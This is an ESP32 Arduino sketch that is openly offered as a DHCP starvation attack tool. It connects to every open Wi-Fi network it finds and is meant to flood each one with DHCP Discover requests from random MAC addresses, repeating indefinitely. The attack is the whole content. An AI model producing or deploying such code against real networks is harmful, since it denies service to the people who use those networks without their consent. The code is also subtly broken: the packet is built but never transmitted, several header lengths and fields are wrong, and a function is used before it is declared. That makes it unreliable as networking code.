#include <WiFi.h>
#include <WiFiUdp.h>

// Function to generate a random MAC address
String generateRandomMAC() {
  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           random(256), random(256), random(256),
           random(256), random(256), random(256));
  return String(mac);
}

// Function to send a DHCP Discover packet
void sendDHCPDiscover(const String& mac) {
  uint8_t buffer[300];
  int packetSize = 0;

  // Ethernet Header
  buffer[packetSize++] = 0xFF; // Destination MAC (Broadcast)
  buffer[packetSize++] = 0xFF;
  buffer[packetSize++] = 0xFF;
  buffer[packetSize++] = 0xFF;
  buffer[packetSize++] = 0xFF;
  buffer[packetSize++] = 0xFF;
  for (int i = 0; i < 6; i++) { // Source MAC
    buffer[packetSize++] = strtol(mac.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
  buffer[packetSize++] = 0x08; // EtherType (IPv4)
  buffer[packetSize++] = 0x00;

  // IP Header
  buffer[packetSize++] = 0x45; // Version and Header Length
  buffer[packetSize++] = 0x00; // Type of Service
  buffer[packetSize++] = 0x01; // Total Length (to be filled later)
  buffer[packetSize++] = 0x48;
  buffer[packetSize++] = 0x00; // Identification
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Flags and Fragment Offset
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x80; // TTL
  buffer[packetSize++] = 0x11; // Protocol (UDP)
  buffer[packetSize++] = 0x00; // Header Checksum (to be filled later)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Source IP (0.0.0.0)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0xFF; // Destination IP (255.255.255.255)
  buffer[packetSize++] = 0xFF;
  buffer[packetSize++] = 0xFF;
  buffer[packetSize++] = 0xFF;

  // UDP Header
  buffer[packetSize++] = 0x00; // Source Port (68)
  buffer[packetSize++] = 0x44;
  buffer[packetSize++] = 0x00; // Destination Port (67)
  buffer[packetSize++] = 0x43;
  buffer[packetSize++] = 0x00; // Length (to be filled later)
  buffer[packetSize++] = 0x34;
  buffer[packetSize++] = 0x00; // Checksum (optional, 0 for now)
  buffer[packetSize++] = 0x00;

  // DHCP Payload
  buffer[packetSize++] = 0x01; // Message Type (Discover)
  buffer[packetSize++] = 0x01; // Hardware Type (Ethernet)
  buffer[packetSize++] = 0x06; // Hardware Address Length
  buffer[packetSize++] = 0x00; // Hops
  buffer[packetSize++] = 0x00; // Transaction ID (random)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Seconds Elapsed
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Flags
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Client IP Address (0.0.0.0)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Your IP Address (0.0.0.0)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Server IP Address (0.0.0.0)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Gateway IP Address (0.0.0.0)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00;
  for (int i = 0; i < 6; i++) { // Client MAC Address
    buffer[packetSize++] = strtol(mac.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
  for (int i = 0; i < 10; i++) { // Padding
    buffer[packetSize++] = 0x00;
  }
  buffer[packetSize++] = 0x00; // Server Name (empty)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x00; // Boot File Name (empty)
  buffer[packetSize++] = 0x00;
  buffer[packetSize++] = 0x63; // Magic Cookie
  buffer[packetSize++] = 0x82;
  buffer[packetSize++] = 0x53;
  buffer[packetSize++] = 0x63;
  buffer[packetSize++] = 0x35; // Option: DHCP Message Type (Discover)
  buffer[packetSize++] = 0x01;
  buffer[packetSize++] = 0x01;
  buffer[packetSize++] = 0x37; // Option: Parameter Request List
  buffer[packetSize++] = 0x04;
  buffer[packetSize++] = 0x01;
  buffer[packetSize++] = 0x03;
  buffer[packetSize++] = 0x06;
  buffer[packetSize++] = 0x2A;
  buffer[packetSize++] = 0xFF; // Option: End
}

// Function to scan and connect to open Wi-Fi networks
void connectToOpenNetworks() {
  Serial.println("Scanning for open Wi-Fi networks...");
  int numNetworks = WiFi.scanNetworks();
  if (numNetworks == 0) {
    Serial.println("No networks found.");
    return;
  }

  for (int i = 0; i < numNetworks; i++) {
    if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
      Serial.print("Connecting to open network: ");
      Serial.println(WiFi.SSID(i));
      WiFi.begin(WiFi.SSID(i).c_str());
      while (WiFi.status() != WL_CONNECTED) {
        delay(500);
        Serial.print(".");
      }
      Serial.println("\nConnected!");
      performDHCPStarvation();
      WiFi.disconnect();
      Serial.println("Disconnected from network.");
    }
  }
}

// Function to perform DHCP starvation attack
void performDHCPStarvation() {
  Serial.println("Starting DHCP starvation attack...");
  for (int i = 0; i < 100; i++) { // Send 100 DHCP Discover packets
    String mac = generateRandomMAC();
    sendDHCPDiscover(mac);
    Serial.print("Sent DHCP Discover packet #");
    Serial.print(i + 1);
    Serial.print(" with MAC: ");
    Serial.println(mac);
    delay(1000); // Delay between packets
  }
  Serial.println("DHCP starvation attack completed.");
}

void setup() {
  Serial.begin(115200);
  randomSeed(analogRead(0)); // Seed the random number generator
  WiFi.mode(WIFI_STA); // Set ESP32 to station mode
  WiFi.disconnect(); // Disconnect from any previous network
  delay(100);
}

void loop() {
  connectToOpenNetworks();
  delay(5000); // Wait before scanning again
}
